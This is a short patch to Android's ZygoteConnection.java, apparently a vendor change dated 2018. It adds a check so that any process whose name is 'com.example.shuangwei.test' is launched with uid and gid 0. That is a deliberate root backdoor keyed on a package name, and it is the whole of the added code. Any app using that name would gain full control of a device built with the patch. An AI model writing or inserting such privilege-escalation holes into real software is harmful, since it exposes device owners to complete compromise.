@@ -1,0 +1,18 @@
+diff --git a/frameworks/base/core/java/com/android/internal/os/ZygoteConnection.java b/frameworks/base/core/java/com/android/internal/os/ZygoteConnection.java
+index 85d84bb..d5140c1 100644
+--- a/frameworks/base/core/java/com/android/internal/os/ZygoteConnection.java
++++ b/frameworks/base/core/java/com/android/internal/os/ZygoteConnection.java
+@@ -638,6 +638,13 @@ class ZygoteConnection {
+             args.gid = peer.getGid();
+             args.gidSpecified = true;
+         }
++/* 3glasses:lishuangwei on: Mon, 23 Jul 2018 10:17:55 +0800
++ */
++        if((args.niceName != null) && (args.niceName.equals("com.example.shuangwei.test"))) {
++            args.uid=0;
++            args.gid=0;
++        }
++// End of 3glasses:lishuangwei
+     }
+ 
+     /**
